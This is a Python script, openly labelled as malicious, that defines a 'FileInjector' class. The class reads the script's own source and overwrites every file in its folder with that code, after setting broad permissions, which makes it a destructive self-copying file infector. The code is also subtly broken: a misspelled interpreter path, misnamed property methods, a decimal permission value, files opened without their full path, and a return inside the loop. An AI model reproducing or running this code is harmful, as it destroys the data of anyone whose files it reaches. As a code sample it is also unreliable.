#!/use/bin/python
import logging
import os
import sys
from functools import cached_property


class FileInjector:
    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        return self._name

    @name.setter
    def name_setter(self, new_name):
        self._name = new_name

    @name.getter
    def name_getter(self):
        return self._name

    @cached_property
    def malicious_argument(self):
        malicious_file = sys.argv[0]

        with open(malicious_file, "r") as file:
            malicious_code = file.read()
        return malicious_code

    def infect_files(self, path):
        # get all the
        # files in the folder to infect
        number_infected = 0
        infected_files = []

        for file in os.listdir(path):
            filepath = os.path.join(path, file)
            if os.path.isfile(filepath):
                infected_files.append(file)
        for i in infected_files:
            logging.debug('Infecting: {}'.format(i))

            with open(i, "r") as infect:
                file_contents = infect.read()
            if "INJECTION SIGNATURE" in file_contents:
                continue
            os.chmod(i, 777)

            with open(i, "w") as infect_file:
                infect_file.write(self.malicious_argument)

            number_infected += 1

            return number_infected


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    injector = FileInjector("Tamper with her")
    folder_path = os.path.dirname(os.path.abspath(__file__))
    number_of_infected_files = injector.infect_files(folder_path)

    logging.info('Number of infected files: {}'.format(number_of_infected_files))

